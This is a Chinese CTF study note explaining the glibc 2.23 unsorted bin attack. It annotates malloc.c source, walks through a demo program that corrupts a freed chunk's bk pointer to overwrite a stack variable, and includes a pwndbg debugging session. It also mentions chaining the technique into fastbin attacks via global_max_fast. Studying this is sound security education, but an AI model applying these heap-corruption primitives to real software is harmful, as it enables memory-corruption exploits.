> 参考资料：[https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/1OoZx1ef6wA9H72SniNTe3A](https://pan.baidu.com/s/1OoZx1ef6wA9H72SniNTe3A)  密码: v7o4
>
> --来自百度网盘超级会员V3的分享
>

在说明unsortedbin attack之前，我们先来复习一下unsortedbin中的知识。<font style="color:#F5222D;"></font>

# 前言
> [https://xz.aliyun.com/t/7251](https://xz.aliyun.com/t/7251)
>

unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如**<font style="color:#F5222D;">修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放</font>**，又或者修改_IO_list_all来伪造_IO_FILE进行攻击。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。

> **global_max_fast**是**main_arena**中控制最大**fastbin**大小的变量。
>

# unsortedbin基本来源
1、当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于MINSIZE，就会被放到unsortedbin中。

2、释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。

3、当进行malloc_consolidate时，如果不是和top_chunk近邻的话，可能会把合并后的chunk放到unsortedbin中。

> consolidate是一个动词，其中文意思为：使加强; 使巩固; (使) 结成一体，**<font style="color:#F5222D;">合并</font>**;
>
> 因此malloc_consolidate的意思是堆中的碎片整理，目的是为了减少堆中的碎片。
>

# unsortedbin的使用
1、unsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即**<font style="color:#F5222D;">插入的时候插入到unsortedbin的头部，取出的时候从</font>****<font style="color:#F5222D;">链尾获取，</font>****<font style="color:#F5222D;">因此unsorted bin遍历堆块的时候使用的是bk指针。</font>**

2、在程序malloc时，如果在fastbin，smallbin中找不到对应大小的chunk，就会尝试从unsortedbin中寻找chunk。如果取出的chunk大小刚好满足，就会直接返还给用户，否则就会把这些chunk分别插入到对应的bin中。

# unsortedbin_attack概述
+ Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。
+ Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。
+ Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。

# unsortedbin源码分析
> 这里使用libc-2.23版本的源码
>
> **下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。**
>
> **最重要的是最后的总结，记住就行了。**
>

```c
#源码的第3470行-3597行
	  while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
		#取链表尾部的chunk记作victim
        {
          bck = victim->bk;
          #倒数第二个chunk记作bck
          #接下来对victim的size位进行检查
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);
		  #检查通过，计算victim得到实际chunk的大小
          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
              #假如说我们申请的malloc大小属于smallbin的范围，并且last_remainder是
              #unsortedbin的唯一一个chunk时，优先使用这个chunk。
              
            {
              #假若满足条件则对其进行切割和解链操作
              
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
		  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。
          #其中unsorted_chunks (av)->bk = bck;
          #bck->fd = unsorted_chunks (av);
          #是unsorted bin attack产生的原因，
          #一旦我们绕过之前的检查到达这里，
          #在可以控制victim->bk即bck的情况下我们可以往bck->fd写入unsorted_chunks(av)
          #即*(bck+0x10)=unsorted(av)。
          /* remove from unsorted list */
          #unsortedbin产生的原因：
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
		  #
          /* Take now instead of binning if exact fit */
    	  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。
          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* place chunk in bin */
		  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，
          #需要根据其size放入small bin或large bin的链，
          #其中在后者实现中存在large bin attack，
          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。
          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                  if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size < fwd->size)
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }
```

# unsortedbin_attack原理
从下面的源码中可以看到，当将一个unsortedbin取出时，**会将bck->fd的位置写入本unsortedbin的位置**

```c
#glibc-2.23/malloc/malloc.c
#源码第3515-3517行
		  /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
//unsorted_chunks(av)其实是&main_arena.top
```

换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。

# Demo
## 源码及编译
接下来我们使用一个demo来演示unsortedbin_attack的原理：

> 来源：[https://www.yuque.com/hxfqg9/bin/tubv6q](https://www.yuque.com/hxfqg9/bin/tubv6q)
>
> 感谢@yichen师傅的汉化
>
> **这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。**
>

```c
#include <stdio.h>
#include <stdlib.h>

int main(){

    fprintf(stderr, "unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n");
    fprintf(stderr, "实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n");

    unsigned long stack_var=0;
    fprintf(stderr, "我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n", &stack_var, stack_var);

    unsigned long *p=malloc(0x410);
    fprintf(stderr, "一开始先申请一个比较正常的 chunk: %p\n",p);
    fprintf(stderr, "再分配一个避免与 top chunk 合并\n\n");
    malloc(500);

    free(p);
    fprintf(stderr, "当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n",(void*)p[1]);

    p[1]=(unsigned long)(&stack_var-2);
    fprintf(stderr, "现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n");
    fprintf(stderr, "我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n",(void*)p[1]);

    malloc(0x410);
    fprintf(stderr, "再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n");
    fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
```

大致看一下流程，然后开始进行调试。

> 编译命令：gcc -g demo.c -o demo
>

## 开始调试****
首先对代码的第12行下断点，开始调试程序：

```c
ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from demo...done.
pwndbg> b 12
Breakpoint 1 at 0x400722: file demo.c, line 12.
pwndbg> r
Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo 
unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方
实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备

我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数


Breakpoint 1, main () at demo.c:12
12	    unsigned long *p=malloc(0x410);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────
 RAX  0x51
 RBX  0x0
 RCX  0x7ffff7b04380 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x7ffff7dd3770 (_IO_stdfile_2_lock) ◂— 0x0
 RDI  0x2
 RSI  0x7fffffffb6e0 ◂— 0x87e5acbbe49188e6
 R8   0x7ffff7fda700 ◂— 0x7ffff7fda700
 R9   0x51
 R10  0x0
 R11  0x246
 R12  0x4005b0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffde70 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdd90 —▸ 0x400870 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffdd70 —▸ 0x400870 (__libc_csu_init) ◂— push   r15
 RIP  0x400722 (main+124) ◂— mov    edi, 0x410
─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────
 ► 0x400722 <main+124>    mov    edi, 0x410
   0x400727 <main+129>    call   malloc@plt <malloc@plt>
 
   0x40072c <main+134>    mov    qword ptr [rbp - 0x10], rax
   0x400730 <main+138>    mov    rax, qword ptr [rip + 0x200929] <0x601060>
   0x400737 <main+145>    mov    rdx, qword ptr [rbp - 0x10]
   0x40073b <main+149>    mov    esi, 0x400a18
   0x400740 <main+154>    mov    rdi, rax
   0x400743 <main+157>    mov    eax, 0
   0x400748 <main+162>    call   fprintf@plt <fprintf@plt>
 
   0x40074d <main+167>    mov    rax, qword ptr [rip + 0x20090c] <0x601060>
   0x400754 <main+174>    mov    rcx, rax
──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c
    7     fprintf(stderr, "实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n");
    8 
    9     unsigned long stack_var=0;
   10     fprintf(stderr, "我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n", &stack_var, stack_var);
   11 
 ► 12     unsigned long *p=malloc(0x410);
   13     fprintf(stderr, "一开始先申请一个比较正常的 chunk: %p\n",p);
   14     fprintf(stderr, "再分配一个避免与 top chunk 合并\n\n");
   15     malloc(500);
   16 
   17     free(p);
──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdd70 —▸ 0x400870 (__libc_csu_init) ◂— push   r15
01:0008│      0x7fffffffdd78 ◂— 0x0
02:0010│      0x7fffffffdd80 —▸ 0x7fffffffde70 ◂— 0x1
03:0018│      0x7fffffffdd88 ◂— 0xbfb16d8983641800
04:0020│ rbp  0x7fffffffdd90 —▸ 0x400870 (__libc_csu_init) ◂— push   r15
05:0028│      0x7fffffffdd98 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
06:0030│      0x7fffffffdda0 ◂— 0x1
07:0038│      0x7fffffffdda8 —▸ 0x7fffffffde78 —▸ 0x7fffffffe20d ◂— '/home/ubuntu/Desktop/unsortedbin_demo/demo'
────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────
 ► f 0           400722 main+124
   f 1     7ffff7a2d840 __libc_start_main+240
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

看一下这时的本地变量情况：

```c
pwndbg> info local
stack_var = 0
p = 0x7fffffffde70
pwndbg> x/5gx &stack_var
0x7fffffffdd78:	0x0000000000000000	0x00007fffffffde70
0x7fffffffdd88:	0xbfb16d8983641800	0x0000000000400870
0x7fffffffdd98:	0x00007ffff7a2d840
pwndbg> x/5gx &p
0x7fffffffdd80:	0x00007fffffffde70	0xbfb16d8983641800
0x7fffffffdd90:	0x0000000000400870	0x00007ffff7a2d840
0x7fffffffdda0:	0x0000000000000001
pwndbg> 
```

从上面的代码框可以看到，此时：

+ stack_var的值为0，此变量的地址为0x7fffffffdd78
+ p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80****

## 执行unsigned long *p=malloc(0x410);
对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：

```c
pwndbg> heap
Allocated chunk
Addr: 0x602000
Size: 0x00
pwndbg> top_chunk
Top chunk
Addr: 0x602420
Size: 0x00
pwndbg> info local
stack_var = 0
p = 0x602010
pwndbg> x/160gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000421 #malloc_chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
......（省略内容均为空）
0x602420:	0x0000000000000000	0x0000000000020be1 #top_chunk
......（省略内容均为空）
0x6024f0:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602420 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> 
```

## 执行malloc(500);
现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：

```c
pwndbg> heap
Allocated chunk
Addr: 0x602000
Size: 0x00

pwndbg> top_chunk
Top chunk
Addr: 0x602620
Size: 0x00
pwndbg> x/16gx &main_arena 
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602620 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> x/300gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000421 #malloc_chunk1
......（省略内容均为空）
0x602420:	0x0000000000000000	0x0000000000000201 #malloc_chunk1
......（省略内容均为空）
0x602620:	0x0000000000000000	0x00000000000209e1 #top_chunk
......（省略内容均为空）
0x602950:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。

> **<font style="color:#F5222D;">释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。</font>**
>

## 执行free(p);
对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：

```c
unsortedbin
all [corrupted]
FD: 0x602000 ◂— 0x0
BK: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000421 #unsortedbin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
    		#fd					#bk
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> x/30gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
......(省略内容均为空)
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602620 
 													#指向top_chunk
													#unsortedbin指向的地方
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000602000 
    												#unsortedbin
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000602000	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
0x7ffff7dd1bb0 <main_arena+144>:	0x00007ffff7dd1b98	0x00007ffff7dd1ba8
0x7ffff7dd1bc0 <main_arena+160>:	0x00007ffff7dd1ba8	0x00007ffff7dd1bb8
0x7ffff7dd1bd0 <main_arena+176>:	0x00007ffff7dd1bb8	0x00007ffff7dd1bc8
0x7ffff7dd1be0 <main_arena+192>:	0x00007ffff7dd1bc8	0x00007ffff7dd1bd8
0x7ffff7dd1bf0 <main_arena+208>:	0x00007ffff7dd1bd8	0x00007ffff7dd1be8
0x7ffff7dd1c00 <main_arena+224>:	0x00007ffff7dd1be8	0x00007ffff7dd1bf8
pwndbg> 
```

在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605518448778-38373f22-a306-4fe8-8c15-7a084e086147.png)

## 执行p[1]=(unsigned long)(&stack_var-2);
对代码第21行下断点，继续：p[1]=(unsigned long)(&stack_var-2);

```c
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000421
0x602010:	0x00007ffff7dd1b78	0x00007fffffffdd68
    		#fd					#bk被更改
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。

```c
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x602000 ◂— 0x0
BK: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
pwndbg> x/16gx 0x00007fffffffdd68
0x7fffffffdd68:	0x00000000004007a8	0x0000000000400870
    			#unsortedbin中bk指针所指向的地方
0x7fffffffdd78:	0x0000000000000000	0x0000000000602010
    			#想要被修改为超大值的地方
0x7fffffffdd88:	0xbfb16d8983641800	0x0000000000400870
0x7fffffffdd98:	0x00007ffff7a2d840	0x0000000000000001
0x7fffffffdda8:	0x00007fffffffde78	0x00000001f7ffcca0
0x7fffffffddb8:	0x00000000004006a6	0x0000000000000000
0x7fffffffddc8:	0x9c796560ff5ea285	0x00000000004005b0
0x7fffffffddd8:	0x00007fffffffde70	0x0000000000000000
pwndbg> 
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605518532583-ef6d2bd7-01e3-4c82-9cdd-21d6d20a1e1a.png)

## 执行malloc(0x410)
执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的**<font style="color:#F5222D;">最后一个</font>**chunk拿出来。

~~由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。~~

> unsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即**<font style="color:#F5222D;">插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。</font>**
>

```c
#malloc之后结果如下：
pwndbg> unsortedbin
unsortedbin
all [corrupted]
FD: 0x602000 ◂— 0x0
BK: 0x7fffffffdd68 —▸ 0x400870 (__libc_csu_init) ◂— push   rbp
pwndbg> x/30gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602620 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000602000 #malloc(0x410)
0x7ffff7dd1b90 <main_arena+112>:	0x00007fffffffdd68	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
0x7ffff7dd1bb0 <main_arena+144>:	0x00007ffff7dd1b98	0x00007ffff7dd1ba8
0x7ffff7dd1bc0 <main_arena+160>:	0x00007ffff7dd1ba8	0x00007ffff7dd1bb8
0x7ffff7dd1bd0 <main_arena+176>:	0x00007ffff7dd1bb8	0x00007ffff7dd1bc8
0x7ffff7dd1be0 <main_arena+192>:	0x00007ffff7dd1bc8	0x00007ffff7dd1bd8
0x7ffff7dd1bf0 <main_arena+208>:	0x00007ffff7dd1bd8	0x00007ffff7dd1be8
0x7ffff7dd1c00 <main_arena+224>:	0x00007ffff7dd1be8	0x00007ffff7dd1bf8
pwndbg> x/16gx 0x7fffffffdd68
0x7fffffffdd68:	0x000000000040080a	0x0000000000400870
0x7fffffffdd78:	0x00007ffff7dd1b78	0x0000000000602010
    			#现在此地址被更改为较大的数（其值为main_arena+88的地址）
0x7fffffffdd88:	0xbfb16d8983641800	0x0000000000400870
0x7fffffffdd98:	0x00007ffff7a2d840	0x0000000000000001
0x7fffffffdda8:	0x00007fffffffde78	0x00000001f7ffcca0
0x7fffffffddb8:	0x00000000004006a6	0x0000000000000000
0x7fffffffddc8:	0x9c796560ff5ea285	0x00000000004005b0
0x7fffffffddd8:	0x00007fffffffde70	0x0000000000000000
pwndbg>  
```

申请过程如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605532168101-57e7d7b0-b051-4c2d-89b2-2fb8cdd2c2a5.png)![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605532214849-ed5b7433-5172-407f-b9a0-ee4bb07306fa.png)

核心代码如下：

```c
#glibc-2.23/malloc/malloc.c
#源码第3515-3517行
--------------------------------------------------------------------
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck; //unsortedbin的bk改为chunk的bk
bck->fd = unsorted_chunks (av);//将chunk的bk所指向的fd改为unsortedbin的地址
//unsorted_chunks(av)其实是&main_arena.top
--------------------------------------------------------------------
解释：
unsorted_chunks (av)->bk(unsortedbin的bk)= bck(chunk的bk); 
bck->fd (chunk的fd)= unsorted_chunks (av);
```

运行结果如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605533363080-559139a8-bb5d-4341-b491-f191f494060d.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605533406267-0b809590-6df8-4409-870c-a29f64cf4a6c.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605530691021-ab93a5d4-3663-4274-8710-5cb7271cd361.png)

# 反思
再来看一下unsortedbin的源码

```c
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */
		  #显然，bck被修改，并不符合这里的要求
          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* remove from unsorted list */
```

**可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，****<font style="color:#F5222D;">victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</font>**然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605530691021-ab93a5d4-3663-4274-8710-5cb7271cd361.png)

**<font style="color:#F5222D;">这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，</font>**唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说

+ 我们通过修改循环的次数来使得程序可以执行多次循环。
+ **<font style="color:#F5222D;">我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。</font>**

# 总结
总结一下unsortedbin attack这种攻击方式：

首先我们将一个堆块释放到unsortedbin中，然后利用堆溢出修改unsortedbin中chunk的bk指针，这个bk指针是指向target_addr-0x10。当我们malloc申请unsortedbin中的堆块时，target_addr中的值就会变成main_arena+88**<font style="color:#F5222D;">地址的值</font>**

> target_addr：目标地址（想要修改为超大数的地址）
>

